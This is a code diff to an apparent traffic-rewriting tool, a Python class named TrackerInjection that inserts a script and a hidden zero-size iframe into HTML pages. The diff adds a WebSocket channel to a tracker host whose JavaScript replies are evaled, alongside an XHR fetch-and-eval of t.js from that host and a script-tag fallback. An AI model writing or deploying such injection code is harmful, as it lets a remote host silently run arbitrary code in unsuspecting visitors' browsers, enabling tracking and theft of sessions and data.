@@ -36,26 +36,41 @@ class TrackerInjection(object):
 (function(){
     var t = "//%s/t.js";
     try {
-	var xhr = new XMLHttpRequest();
-	xhr.open("GET", t, true);
+        var ws = new WebSocket("ws://%s/ws");
+        ws.addEventListener("open", function(event) {
+                ws.send("/t.js");
+            }, false);
+        ws.addEventListener("message", function(event){
+                if (event.data) {
+                    var obj = JSON.parse(event.data);
+                    if ("ok" == obj["status"]) {
+                        if ("text/javascript" == obj["content_type"]) { 
+                            eval(obj["body"]);
+                        }
+                    }
+                }
+            }, false);
+    } catch (ignore) {}
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", t, true);
         xhr.setRequestHeader("X-CrossSite", "1");
-	xhr.onreadystatechange = function(){
-	    if (4 == xhr.readyState) {
-//alert(xhr.responseText);
-		eval(xhr.responseText);
-	    }
-	}
-	xhr.send(null);
+        xhr.onreadystatechange = function(){
+            if (4 == xhr.readyState) {
+                eval(xhr.responseText);
+            }
+        }
+        xhr.send(null);
     } catch(e) {
-alert(e);
-	var ts = document.createElement("script");
-	ts.src = t;
-	ts.type = "text/javascript";
-	ts.defer = ts.async = true;
+        var ts = document.createElement("script");
+        ts.src = t;
+        ts.type = "text/javascript";
+        ts.defer = ts.async = true;
         var s = document.getElementsByTagName('script')[0]; 
         s.parentNode.insertBefore(ts, s);
     }
-})();''' % (tracker_host)
+})();''' % (tracker_host, tracker_host)
+
         self.html_injection_content = r'<script>%s</script><iframe src="//%s/t.html" height="0" width="0" frameBorder="0"></iframe>' % (self.script_injection_content, tracker_host)
 #        self.script_injection_content = r'(function(){if (!!window.trackid){var s = document.createElement("script");}})()'
         self.re_inject_html = re.compile(r'(</html|</body)', re.I)
